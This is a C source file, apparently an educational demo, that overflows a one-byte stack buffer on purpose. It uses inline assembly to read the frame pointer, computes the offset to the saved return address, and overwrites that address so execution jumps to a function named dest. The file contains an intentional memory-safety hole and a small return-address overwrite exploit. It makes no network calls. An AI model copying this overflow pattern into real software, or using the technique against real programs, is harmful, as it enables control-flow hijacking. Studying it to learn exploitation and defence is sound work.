/* WARNING: modifying code will influence function addresses -> failure*/

#include <stdint.h>
#include "stdio.h"
#include "string.h"

// #define OFFSET 0xD
// #define _OFFSET (ebp - ((void*)buf))

// #define LEN (offset + 2*sizeof(void*))

#define MAX (0xff)

void dest(void)
{
    // delay
    int i, j, k;
	for(k = 0; k < 0xf; k++)
    {
		for(i = 0; i < 10; i++)
        {
			for(j = 0; j < 10000; j++) {}
		}
	}
    printf("In dest now\n");
    exit(0);
}

uint32_t offset = 0;
void *target = dest; // addr of dest

void vulnerability(char *input, int get_offset)
{
    char buf[0x1] = {0};

   // get ebp:
    void* ebp = 0;
    asm volatile("movl %%ebp, %0": "=r" (ebp));
    // calc eip by ebp:
    void **eip = (((void**)ebp) + 1); // addr of eip
    printf("eip: %x\n", (uint32_t)(*eip));
    // printf("dest: %x\n", target);

    if (get_offset)
    {    
        offset = (uint32_t)eip - (uint32_t)buf;
        printf("offset: %x\n", offset);
        return;
    }

// ===========================================
    printf(" input: %x\n", *(uint32_t*)(input + offset));
    printf(" target: %x\n", target);
    memcpy(buf, input, offset + sizeof(void*));
// ===========================================
    // memcpy(eip, &target, sizeof(target));

    return;
}

#define	PROC_IMAGE_SIZE_DEFAULT	0x100000

int main(int argc, char *argv[])
{
    char payload[MAX] = {0};
    vulnerability(payload, 1);

    // *(void**)(payload + offset) = target;
    // printf(" payload: %x\n", *(int*)(payload + offset));
    *(uint32_t*)(payload + offset) = (uint32_t)target;
    printf(" payload: %x\n", *(uint32_t*)(payload + offset));

    vulnerability(payload, 0);
}

// for test:
// {
//     printf("main: %x\n", main);
//     // get a eip in main:
//     {
//         void *eip = 0;
//         asm volatile("call 1f\n1: pop %0" : "=r" (eip));
//         printf("eip: %x\n", eip);
//     } 
// }

// <- buf

// <- eip = buf + offset



// old_ebp <- ebp
// eip